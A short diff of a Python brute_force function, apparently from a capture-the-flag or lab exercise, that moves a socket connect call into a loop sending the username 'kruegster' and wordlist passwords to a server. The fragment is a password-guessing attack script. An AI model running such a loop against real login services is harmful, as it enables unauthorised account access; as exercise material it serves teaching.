@@ -55,14 +55,14 @@ def brute_force():
             the Briong server.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
+
 
     wordlistFile = open(wordlist)
 
     username = "kruegster"  # Hint: use OSINT
 
     for word in wordlistFile:
-
+        s.connect((host, port))
         password = word  # Hint: use wordlist
 
         s.send(username + "\n")
